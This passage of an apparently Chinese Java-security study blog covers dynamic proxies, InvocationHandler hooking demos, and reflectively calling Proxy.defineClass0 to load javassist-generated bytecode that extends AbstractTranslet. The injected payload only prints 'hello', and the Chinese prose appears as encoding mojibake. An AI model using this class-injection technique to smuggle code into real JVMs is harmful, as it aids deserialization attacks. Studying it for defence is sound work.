ÂÆö‰πâ‰ª£ÁêÜÁ±ªÁöÑÁ±ªÂä†ËΩΩÂô®</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces ‰ª£ÁêÜÁ±ªË¶ÅÂÆûÁé∞ÁöÑÊé•Âè£ÂàóË°®</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> Áî®ÊåáÂÆöÁöÑÁ±ªÂä†ËΩΩÂô®ÂÆö‰πâÁöÑ‰ª£ÁêÜÁ±ªÔºåÂÆÉÂèØ‰ª•ÂÆûÁé∞ÊåáÂÆöÁöÑÊé•Âè£</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Ê£ÄÊµãÊüê‰∏™Á±ªÊòØÂê¶ÊòØÂä®ÊÄÅ‰ª£ÁêÜÁ±ª</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cl Ë¶ÅÊµãËØïÁöÑÁ±ª</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> Â¶ÇËØ•Á±ª‰∏∫‰ª£ÁêÜÁ±ªÔºåÂàô‰∏∫ trueÔºåÂê¶Âàô‰∏∫ false</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ÂêëÊåáÂÆöÁöÑÁ±ªÂä†ËΩΩÂô®‰∏≠ÂÆö‰πâ‰∏Ä‰∏™Á±ªÂØπË±°</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader Á±ªÂä†ËΩΩÂô®</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name   Á±ªÂêç</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> b      Á±ªÂ≠óËäÇÁ†Å</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> off    Êà™ÂèñÂºÄÂßã‰ΩçÁΩÆ</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> len    Êà™ÂèñÈïøÂ∫¶</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JVMÂàõÂª∫ÁöÑÁ±ªClassÂØπË±°</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class <span class="hljs-title">defineClass0</span><span class="hljs-params">(ClassLoader loader, String name, <span class="hljs-keyword">byte</span>[] b, <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len)</span></span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h6 id="java-lang-reflect-InvocationHandler"><a href="#java-lang-reflect-InvocationHandler" class="headerlink" title="java.lang.reflect.InvocationHandler"></a>java.lang.reflect.InvocationHandler</h6><p>Áî®‰∫éË∞ÉÁî®<code>java.lang.reflect.Proxy</code>ÁîüÊàêÁöÑ‰ª£ÁêÜÁ±ªÊñπÊ≥ïÔºåÊé•Âè£‰∏≠Âè™ÂÆö‰πâ‰∫Ü‰∏Ä‰∏™ÊñπÊ≥ï</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ÊØè‰∏™‰ª£ÁêÜÂÆû‰æãÈÉΩÂÖ∑Êúâ‰∏Ä‰∏™ÂÖ≥ËÅîÁöÑË∞ÉÁî®Â§ÑÁêÜÁ®ãÂ∫è„ÄÇÂØπ‰ª£ÁêÜÂÆû‰æãË∞ÉÁî®ÊñπÊ≥ïÊó∂ÔºåÂ∞ÜÂØπÊñπÊ≥ïË∞ÉÁî®ËøõË°åÁºñÁ†ÅÂπ∂</span><br><span class="hljs-comment"> * Â∞ÜÂÖ∂ÊåáÊ¥æÂà∞ÂÆÉÁöÑË∞ÉÁî®Â§ÑÁêÜÁ®ãÂ∫èÁöÑ invoke ÊñπÊ≥ï„ÄÇ</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Âú®‰ª£ÁêÜÂÆû‰æã‰∏äÂ§ÑÁêÜÊñπÊ≥ïË∞ÉÁî®Âπ∂ËøîÂõûÁªìÊûú„ÄÇÂú®‰∏éÊñπÊ≥ïÂÖ≥ËÅîÁöÑ‰ª£ÁêÜÂÆû‰æã‰∏äË∞ÉÁî®ÊñπÊ≥ïÊó∂ÔºåÂ∞ÜÂú®Ë∞ÉÁî®Â§ÑÁêÜÁ®ãÂ∫è‰∏äË∞ÉÁî®Ê≠§ÊñπÊ≥ï„ÄÇ</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy  Âú®ÂÖ∂‰∏äË∞ÉÁî®ÊñπÊ≥ïÁöÑ‰ª£ÁêÜÂÆû‰æã</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> method ÂØπÂ∫î‰∫éÂú®‰ª£ÁêÜÂÆû‰æã‰∏äË∞ÉÁî®ÁöÑÊé•Âè£ÊñπÊ≥ïÁöÑ Method ÂÆû‰æã„ÄÇMethod ÂØπË±°ÁöÑÂ£∞ÊòéÁ±ªÂ∞ÜÊòØÂú®ÂÖ∂‰∏≠Â£∞Êòé</span><br><span class="hljs-comment">     *               ÊñπÊ≥ïÁöÑÊé•Âè£ÔºåËØ•Êé•Âè£ÂèØ‰ª•ÊòØ‰ª£ÁêÜÁ±ªËµñ‰ª•ÁªßÊâøÊñπÊ≥ïÁöÑ‰ª£ÁêÜÊé•Âè£ÁöÑË∂ÖÊé•Âè£„ÄÇ</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args   ÂåÖÂê´‰º†ÂÖ•‰ª£ÁêÜÂÆû‰æã‰∏äÊñπÊ≥ïË∞ÉÁî®ÁöÑÂèÇÊï∞ÂÄºÁöÑÂØπË±°Êï∞ÁªÑÔºåÂ¶ÇÊûúÊé•Âè£ÊñπÊ≥ï‰∏ç‰ΩøÁî®ÂèÇÊï∞Ôºå</span><br><span class="hljs-comment">     *               Âàô‰∏∫ null„ÄÇÂü∫Êú¨Á±ªÂûãÁöÑÂèÇÊï∞Ë¢´ÂåÖË£ÖÂú®ÈÄÇÂΩìÂü∫Êú¨ÂåÖË£ÖÂô®Á±ªÔºàÂ¶Ç java.lang.Integer</span><br><span class="hljs-comment">     *               Êàñ java.lang.BooleanÔºâÁöÑÂÆû‰æã‰∏≠„ÄÇ</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ‰ªé‰ª£ÁêÜÂÆû‰æãÁöÑÊñπÊ≥ïË∞ÉÁî®ËøîÂõûÁöÑÂÄº„ÄÇÂ¶ÇÊûúÊé•Âè£ÊñπÊ≥ïÁöÑÂ£∞ÊòéËøîÂõûÁ±ªÂûãÊòØÂü∫Êú¨Á±ªÂûãÔºå</span><br><span class="hljs-comment">     * ÂàôÊ≠§ÊñπÊ≥ïËøîÂõûÁöÑÂÄº‰∏ÄÂÆöÊòØÁõ∏Â∫îÂü∫Êú¨ÂåÖË£ÖÂØπË±°Á±ªÁöÑÂÆû‰æãÔºõÂê¶ÂàôÔºåÂÆÉ‰∏ÄÂÆöÊòØÂèØÂàÜÈÖçÂà∞Â£∞ÊòéËøîÂõûÁ±ªÂûãÁöÑÁ±ªÂûã„ÄÇ</span><br><span class="hljs-comment">     * Â¶ÇÊûúÊ≠§ÊñπÊ≥ïËøîÂõûÁöÑÂÄº‰∏∫ null Âπ∂‰∏îÊé•Âè£ÊñπÊ≥ïÁöÑËøîÂõûÁ±ªÂûãÊòØÂü∫Êú¨Á±ªÂûãÔºåÂàô‰ª£ÁêÜÂÆû‰æã‰∏äÁöÑÊñπÊ≥ïË∞ÉÁî®Â∞ÜÊäõÂá∫</span><br><span class="hljs-comment">     * NullPointerException„ÄÇÂê¶ÂàôÔºåÂ¶ÇÊûúÊ≠§ÊñπÊ≥ïËøîÂõûÁöÑÂÄº‰∏é‰∏äËø∞Êé•Âè£ÊñπÊ≥ïÁöÑÂ£∞ÊòéËøîÂõûÁ±ªÂûã‰∏çÂÖºÂÆπÔºå</span><br><span class="hljs-comment">     * Âàô‰ª£ÁêÜÂÆû‰æã‰∏äÁöÑÊñπÊ≥ïË∞ÉÁî®Â∞ÜÊäõÂá∫ ClassCastException„ÄÇ</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Throwable ‰ªé‰ª£ÁêÜÂÆû‰æã‰∏äÁöÑÊñπÊ≥ïË∞ÉÁî®ÊäõÂá∫ÁöÑÂºÇÂ∏∏„ÄÇËØ•ÂºÇÂ∏∏ÁöÑÁ±ªÂûãÂøÖÈ°ªÂèØ‰ª•ÂàÜÈÖçÂà∞Âú®Êé•Âè£ÊñπÊ≥ïÁöÑ</span><br><span class="hljs-comment">     *                   throws Â≠êÂè•‰∏≠Â£∞ÊòéÁöÑ‰ªª‰∏ÄÂºÇÂ∏∏Á±ªÂûãÊàñÊú™ÁªèÊ£ÄÊü•ÁöÑÂºÇÂ∏∏Á±ªÂûã java.lang.RuntimeException Êàñ</span><br><span class="hljs-comment">     *                   java.lang.Error„ÄÇÂ¶ÇÊûúÊ≠§ÊñπÊ≥ïÊäõÂá∫ÁªèËøáÊ£ÄÊü•ÁöÑÂºÇÂ∏∏ÔºåËØ•ÂºÇÂ∏∏‰∏çÂèØÂàÜÈÖçÂà∞Âú®Êé•Âè£ÊñπÊ≥ïÁöÑ throws Â≠êÂè•‰∏≠</span><br><span class="hljs-comment">     *                   Â£∞ÊòéÁöÑ‰ªª‰∏ÄÂºÇÂ∏∏Á±ªÂûãÔºå‰ª£ÁêÜÂÆû‰æãÁöÑÊñπÊ≥ïË∞ÉÁî®Â∞ÜÊäõÂá∫ÂåÖÂê´Ê≠§ÊñπÊ≥ïÊõæÊäõÂá∫ÁöÑÂºÇÂ∏∏ÁöÑ</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="‰ΩøÁî®-java-lang-reflect-Proxy-Âä®ÊÄÅÂàõÂª∫Á±ªÂØπË±°"><a href="#‰ΩøÁî®-java-lang-reflect-Proxy-Âä®ÊÄÅÂàõÂª∫Á±ªÂØπË±°" class="headerlink" title="‰ΩøÁî® java.lang.reflect.Proxy Âä®ÊÄÅÂàõÂª∫Á±ªÂØπË±°"></a>‰ΩøÁî® java.lang.reflect.Proxy Âä®ÊÄÅÂàõÂª∫Á±ªÂØπË±°</h5><p><code>ClassLoader</code>Âíå<code>Unsafe</code>ÈÉΩÊúâ‰∏Ä‰∏™Âè´ÂÅö<code>defineClassXXX</code>ÁöÑ<code>native</code>ÊñπÊ≥ïÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáË∞ÉÁî®Ëøô‰∏™<code>native</code>ÊñπÊ≥ïÂä®ÊÄÅÁöÑÂêë<code>JVM</code>ÂàõÂª∫‰∏Ä‰∏™Á±ªÂØπË±°ÔºåËÄå<code>java.lang.reflect.Proxy</code>Á±ªÊÅ∞Â•Ω‰πüÊúâËøô‰πà‰∏Ä‰∏™<code>native</code>ÊñπÊ≥ïÔºåÊâÄ‰ª•Êàë‰ª¨‰πüÂ∞ÜÂèØ‰ª•ÈÄöËøáË∞ÉÁî®<code>java.lang.reflect.Proxy</code>Á±ª<code>defineClass0</code>ÊñπÊ≥ïÂÆûÁé∞Âä®ÊÄÅÂàõÂª∫Á±ªÂØπË±°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyDefineclass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            ClassPool cp = ClassPool.getDefault();<br>            cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>            CtClass ctClass = cp.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>            String cmd = <span class="hljs-string">&quot;java.lang.System.out.println(\&quot;hello\&quot;);&quot;</span>;<br>            ctClass.makeClassInitializer().insertBefore(cmd);<br>            ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>            <span class="hljs-keyword">byte</span>[] classbyte = ctClass.toBytecode();<br>            System.out.println();<br>            ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();<br>            Method defineClass0 = Proxy.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass0&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;ClassLoader.class, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class&#125;);<br>            defineClass0.setAccessible(<span class="hljs-keyword">true</span>);<br>            Class invokedefineclass0 = (Class) defineClass0.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[]&#123;systemClassLoader, <span class="hljs-string">&quot;Cat&quot;</span>, classbyte, <span class="hljs-number">0</span>, classbyte.length&#125;);<br>            System.out.println(invokedefineclass0);<br>        &#125; <span class="hljs-keyword">catch</span> (CannotCompileException | NoSuchMethodException | IllegalAccessException | InvocationTargetException |<br>                 NotFoundException | IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>Âä®ÊÄÅ‰ª£ÁêÜÁîüÊàêÂá∫Êù•ÁöÑÁ±ªÊúâÂ¶Ç‰∏ãÊäÄÊúØÁªÜËäÇÂíåÁâπÊÄßÔºö</strong></p>
<ol>
<li>Âä®ÊÄÅ‰ª£ÁêÜÁöÑÂøÖÈ°ªÊòØÊé•Âè£Á±ªÔºåÈÄöËøá<code>Âä®ÊÄÅÁîüÊàê‰∏Ä‰∏™Êé•Âè£ÂÆûÁé∞Á±ª</code>Êù•‰ª£ÁêÜÊé•Âè£ÁöÑÊñπÊ≥ïË∞ÉÁî®(<code>ÂèçÂ∞ÑÊú∫Âà∂</code>)„ÄÇ</li>
<li>Âä®ÊÄÅ‰ª£ÁêÜÁ±ª‰ºöÁî±<code>java.lang.reflect.Proxy.ProxyClassFactory</code>ÂàõÂª∫„ÄÇ</li>
<li><code>ProxyClassFactory</code>‰ºöË∞ÉÁî®<code>sun.misc.ProxyGenerator</code>Á±ªÁîüÊàêËØ•Á±ªÁöÑÂ≠óËäÇÁ†ÅÔºåÂπ∂Ë∞ÉÁî®<code>java.lang.reflect.Proxy.defineClass0()</code>ÊñπÊ≥ïÂ∞ÜËØ•Á±ªÊ≥®ÂÜåÂà∞<code>JVM</code>„ÄÇ</li>
<li>ËØ•Á±ªÁªßÊâø‰∫é<code>java.lang.reflect.Proxy</code>Âπ∂ÂÆûÁé∞‰∫ÜÈúÄË¶ÅË¢´‰ª£ÁêÜÁöÑÊé•Âè£Á±ªÔºåÂõ†‰∏∫<code>java.lang.reflect.Proxy</code>Á±ªÂÆûÁé∞‰∫Ü<code>java.io.Serializable</code>Êé•Âè£ÔºåÊâÄ‰ª•Ë¢´‰ª£ÁêÜÁöÑÁ±ªÊîØÊåÅ<code>Â∫èÂàóÂåñ/ÂèçÂ∫èÂàóÂåñ</code>„ÄÇ</li>
<li>ËØ•Á±ªÂÆûÁé∞‰∫Ü‰ª£ÁêÜÊé•Âè£Á±ª(Á§∫‰æã‰∏≠ÁöÑÊé•Âè£Á±ªÊòØ<code>com.anbai.sec.proxy.FileSystem</code>)Ôºå‰ºöÈÄöËøá<code>ProxyGenerator</code>Âä®ÊÄÅÁîüÊàêÊé•Âè£Á±ª(<code>FileSystem</code>)ÁöÑÊâÄÊúâÊñπÊ≥ïÔºå</li>
<li>ËØ•Á±ªÂõ†‰∏∫ÂÆûÁé∞‰∫Ü‰ª£ÁêÜÁöÑÊé•Âè£Á±ªÔºåÊâÄ‰ª•ÂΩìÂâçÁ±ªÊòØ‰ª£ÁêÜÁöÑÊé•Âè£Á±ªÁöÑÂÆû‰æã(<code>proxyInstance instanceof FileSystem</code>‰∏∫<code>true</code>)Ôºå‰ΩÜ‰∏çÊòØ‰ª£ÁêÜÊé•Âè£Á±ªÁöÑÂÆûÁé∞Á±ªÁöÑÂÆû‰æã(<code>proxyInstance instanceof UnixFileSystem</code>‰∏∫<code>false</code>)„ÄÇ</li>
<li>ËØ•Á±ªÊñπÊ≥ï‰∏≠ÂåÖÂê´‰∫ÜË¢´‰ª£ÁêÜÁöÑÊé•Âè£Á±ªÁöÑÊâÄÊúâÊñπÊ≥ïÔºåÈÄöËøáË∞ÉÁî®Âä®ÊÄÅ‰ª£ÁêÜÂ§ÑÁêÜÁ±ª(<code>InvocationHandler</code>)ÁöÑ<code>invoke</code>ÊñπÊ≥ïËé∑ÂèñÊñπÊ≥ïÊâßË°åÁªìÊûú„ÄÇ</li>
<li>ËØ•Á±ª‰ª£ÁêÜÁöÑÊñπÂºèÈáçÂÜô‰∫Ü<code>java.lang.Object</code>Á±ªÁöÑ<code>toString</code>„ÄÅ<code>hashCode</code>„ÄÅ<code>equals</code>ÊñπÊ≥ï„ÄÇ</li>
<li>Â¶ÇÊûúÂä®ËøáÂä®ÊÄÅ‰ª£ÁêÜÁîüÊàê‰∫ÜÂ§ö‰∏™Âä®ÊÄÅ‰ª£ÁêÜÁ±ªÔºåÊñ∞ÁîüÊàêÁöÑÁ±ªÂêç‰∏≠ÁöÑ<code>0</code>‰ºöËá™Â¢ûÔºåÂ¶Ç<code>com.sun.proxy.$Proxy0/$Proxy1/$Proxy2</code>„ÄÇ</li>
</ol>
<h5 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassMapDemo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        InvocationHandlerDemo invocationHandlerDemo = <span class="hljs-keyword">new</span> InvocationHandlerDemo(<span class="hljs-keyword">new</span> HashMap());<br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandlerDemo);<br>        System.out.println(proxyMap.put(<span class="hljs-string">&quot;proxy&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>));<br>        proxyMap.get(<span class="hljs-string">&quot;proxy&quot;</span>);<br>        proxyMap.entrySet();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvocationHandlerDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> Object map;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvocationHandlerDemo</span><span class="hljs-params">(Map map)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.map = map;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">if</span> (method.getName().contains(<span class="hljs-string">&quot;put&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Hook Map.put Method: &quot;</span> + method.getName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not allowed&quot;</span>;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;detect the method: &quot;</span> + method.getName() + <span class="hljs-string">&quot;, and exec without being hooked&quot;</span>);<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.map, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ObjectInterface</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Object <span class="hljs-title">getClassName</span><span class="hljs-params">(Object object)</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ORIObjectfindName</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectInterface</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getClassName</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;white class: &quot;</span>+ object.hashCode() +<span class="hljs-string">&quot;, pass!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ObjectfindName</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Object object;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object object)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.object=object;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-keyword">this</span>.getClass().getClassLoader(), <span class="hljs-keyword">this</span>.object.getClass().getInterfaces(),<span class="hljs-keyword">this</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">for</span>(Object o:args)&#123;<br>            System.out.println(<span class="hljs-string">&quot;black class proxy: &quot;</span>+ o.hashCode() +<span class="hljs-string">&quot;, block!&quot;</span>);<br>            <span class="hljs-keyword">if</span> (o.toString().contains(<span class="hljs-string">&quot;System&quot;</span>))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.object,args);<br>    &#125;<br><br><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DynamicProxy</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ORIObjectfindName oriObjectfindName = <span class="hljs-keyword">new</span> ORIObjectfindName();<br>        oriObjectfindName.getClassName(String.class);<br><br>        ObjectInterface oriObjectfindName1 = <span class="hljs-keyword">new</span> ORIObjectfindName();<br>        ObjectfindName objectfindNameproxy = <span class="hljs-keyword">new</span> ObjectfindName();<br>        ObjectInterface objectInterface =(ObjectInterface) objectfindNameproxy.get(oriObjectfindName1);<br>        objectInterface.getClassName(System.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

